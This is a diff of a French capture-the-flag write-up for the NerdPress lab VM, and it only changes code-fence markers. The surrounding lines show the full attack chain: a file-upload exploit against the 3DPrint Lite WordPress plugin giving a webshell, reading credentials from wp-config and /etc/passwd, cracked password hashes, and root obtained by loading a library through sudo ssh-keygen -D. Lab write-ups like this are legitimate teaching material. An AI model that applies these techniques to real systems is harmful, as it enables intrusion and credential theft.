@@ -8,7 +8,7 @@ YetAnotherPress
 
 Le CTF NerdPress disponible sur [iamv1nc3nt.com](https://iamv1nc3nt.com/) se présente comme un CTF de difficulté intermédaire. Allons voir ça de plus près.  
 
-```plain
+```
 Not shown: 65533 closed tcp ports (reset) 
 PORT   STATE SERVICE VERSION 
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) 
@@ -36,7 +36,7 @@ $ docker run --add-host nerdpress:192.168.56.27 -it --rm wpscanteam/wpscan --url
 
 Deux plugins sont présents sur ce blog :  
 
-```plain
+```
 [i] Plugin(s) Identified: 
 
 [+] 3dprint-lite 
@@ -98,7 +98,7 @@ Le *3dprint-lite* correspond au dossier *3dp* que l'on a vu plus tôt. Ce plugin
 
 L'exploit nous obtient un webshell les doigts dans ta sœur :  
 
-```plain
+```
 $ python3 3dprint.py http://nerdpress myshell.php 
 3DPrint Lite <= 1.9.1.4 - Arbitrary File Upload 
 Author -> spacehen (www.github.com/spacehen) 
@@ -112,7 +112,7 @@ Wozilla
 
 Une fois un ReverseSSH établit je commence par récupérer les identifiants dans la fichier de configuration du Wordpress :  
 
-```plain
+```
 /** The name of the database for WordPress */ 
 define( 'DB_NAME', 'wordpress' ); 
 
@@ -131,7 +131,7 @@ define( 'DB_CHARSET', 'utf8mb4' );
 
 Il y a différents utilisateurs sur le wordpress :  
 
-```plain
+```
 mysql> select * from wp_users;  
 +----+------------+------------------------------------+---------------+----------------------+------------------+---------------------+---------------------+-------------+---------------+ 
 | ID | user_login | user_pass                          | user_nicename | user_email           | user_url         | user_registered     | user_activation_key | user_status | display_name  | 
@@ -147,7 +147,7 @@ mysql> select * from wp_users;  
 
 Evidemment cela ne nous sert à rien de casser ces hashs à moins qu'ils soient utilisés aussi pour des comptes locaux :  
 
-```plain
+```
 www-data@nerdpress:/var/www/html$ cat /etc/passwd | grep home 
 syslog:x:104:110::/home/syslog:/usr/sbin/nologin 
 nerd:x:1000:1000:nerd:/home/nerd:/bin/bash 
@@ -159,7 +159,7 @@ pallen:x:1004:1004:,,,:/home/pallen:/bin/bash
 
 C'est d'autant plus intéressant que les permissions ne nous laissent rien voir :  
 
-```plain
+```
 drwx------  2 bgates   bgates   4096 Jan 20 21:19 bgates 
 drwx------  3 nerd     nerd     4096 Jan 20 21:39 nerd 
 drwx------  2 pallen   pallen   4096 Jan 20 22:32 pallen 
@@ -169,7 +169,7 @@ drwx------  3 swozniak swozniak 4096 Jan 20 22:33 swozniak
 
 A l'aide de [PengLab](https://github.com/mxrch/penglab) j'ai cassé quatre de ces hashs :  
 
-```plain
+```
 $P$Bmj3.4ODmeffIV6hu/qhHTjI5tZ8Em/:liverpool08
 $P$Bb9ECl53eqtuyJURHJ/8KrzIYVukpN0:mariaisabel
 $P$BnovC0hZWOV/GmkDYvcJjsKTa0zDZW1:ilovebill
@@ -180,7 +180,7 @@ Ces mots de passe ne fonctionnent pas avec SSH (je les ai testé avec THC-Hydra)
 
 Les comptes *bgates* et *sjobs* ne contiennent rien d'intéressant mais *pallen* peut obtenir un shell pour *swozniak*, le seul pour qui l'on ne disposait pas de mot de passe fonctionnel.  
 
-```plain
+```
 pallen@nerdpress:/var/www/html$ sudo -l 
 Matching Defaults entries for pallen on nerdpress: 
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
@@ -208,7 +208,7 @@ GTFO
 
 Via ce mot de passe on peut obtenir la liste des commandes sudo autorisées :  
 
-```plain
+```
 swozniak@nerdpress:~$ sudo -l 
 [sudo] password for swozniak:  
 Matching Defaults entries for swozniak on nerdpress: 
@@ -245,7 +245,7 @@ ld -shared -o mylib.so mylib.o
 
 Une fois uploadé via sftp avec le tunnel ReveseSSH il ne reste plus qu'à passer root :  
 
-```plain
+```
 swozniak@nerdpress:~$ sudo /usr/bin/ssh-keygen -D /tmp/mylib.so  
 root@nerdpress:/home/swozniak# id 
 uid=0(root) gid=0(root) groups=0(root) 
